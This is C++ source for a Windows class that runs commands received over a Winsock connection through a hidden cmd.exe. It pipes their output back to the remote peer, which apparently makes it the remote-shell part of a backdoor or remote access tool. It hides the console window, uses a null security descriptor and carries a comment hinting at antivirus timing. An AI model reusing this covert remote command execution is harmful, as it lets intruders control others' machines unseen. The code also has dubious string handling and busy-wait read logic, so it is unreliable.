#include "stdafx.h"

// General
#include "LocalProcess.h"


LocalProcess::LocalProcess(WinsockClient* client, CComBSTR name) :
	m_Name(name),
	m_Client(client)
{
	Init();
}

LocalProcess::~LocalProcess()
{
	CloseHandle(m_ProcessInfo.hThread);
	CloseHandle(m_ProcessInfo.hProcess);
	CloseHandle(m_HookStdOut);
	CloseHandle(m_ReadStdOut);
}

//--

void LocalProcess::Init()
{
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, true, NULL, false);

	SECURITY_ATTRIBUTES sa;
	sa.lpSecurityDescriptor = &sd;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = true;

	if (!CreatePipe(&m_ReadStdOut, &m_HookStdOut, &sa, 0))
	{
		m_Client->Send(L"ECreatePipe error.");
		return;
	}

	GetStartupInfo(&m_StartupInfo);
	m_StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	m_StartupInfo.wShowWindow = SW_HIDE;
	m_StartupInfo.hStdOutput = m_HookStdOut;
	m_StartupInfo.hStdError = m_HookStdOut;

	if (!CreateProcess(
		NULL,
		L"cmd.exe /U /c \"" + m_Name + "\"",
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&m_StartupInfo,
		&m_ProcessInfo)
		)
	{
		m_Client->Send(L"ECreateProcess error.");
		return;
	}

	Sleep(100); // ???? AV
	m_Client->Send(L"SThe process [%s] was started.", m_Name);
	Sleep(100);
	Thread<LocalProcess> thread(this, &LocalProcess::WaitProcess);
	thread.start();
	Sleep(100);
}

DWORD LocalProcess::WaitProcess()
{
	char buffer[1024];
	bzero(buffer);

	while (true)
	{
		unsigned long exitCode = 0;
		GetExitCodeProcess(m_ProcessInfo.hProcess, &exitCode);
		if (exitCode != STILL_ACTIVE)
		{
			Sleep(100);
			m_Client->Send(L"XThe process [%s] was exited with code [%d].", m_Name, exitCode);
			Sleep(100);
			return exitCode;
		}

		DWORD readedBytes;
		DWORD avaliableBytes;
		PeekNamedPipe(m_ReadStdOut, buffer, 1023, &readedBytes, &avaliableBytes, NULL);
		if (readedBytes == 0)
		{
			continue;
		}
		
		if (avaliableBytes > 1023)
		{
			while (readedBytes >= 1023)
			{
				ReadFile(m_ReadStdOut, buffer, 1023, &readedBytes, NULL);
				USES_CONVERSION;
				m_Client->Send(L"M%s", A2W(buffer));
				bzero(buffer);
			}
		}
		else
		{
			ReadFile(m_ReadStdOut, buffer, 1023, &readedBytes, NULL);
			USES_CONVERSION;
			m_Client->Send(L"M%s", A2W(buffer));
			bzero(buffer);
		}
	}

	return -1;
}
